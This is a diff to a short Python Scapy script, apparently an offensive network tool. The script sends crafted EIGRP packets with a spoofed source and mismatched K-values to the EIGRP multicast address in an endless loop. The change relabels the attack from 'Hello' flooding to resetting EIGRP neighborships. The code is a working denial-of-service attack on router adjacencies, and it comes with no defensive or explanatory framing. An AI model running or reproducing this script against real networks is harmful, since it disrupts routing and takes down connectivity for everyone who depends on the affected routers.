@@ -41,9 +41,9 @@ args = get_arguments()
 def spray(interface, asn, src):
     frame = Ether(dst=L2Multicast)
     ip = IP(src=args.src, dst=EIGRPMulticast)
-    eigrp = EIGRP(opcode=1, asn=args.asn, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255), EIGRPSwVer()])
+    eigrp = EIGRP(asn=args.asn, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255), EIGRPSwVer()])
     crafted = frame/ip/eigrp
-    print ('[+] The beginning of flooding with "Hello" messages...')
+    print ('[+] The beginning of reset EIGRP neighborships...')
     sendp(crafted, iface=args.interface, loop=1, inter=3, verbose=1)
 
 spray(args.interface, args.asn, args.src)
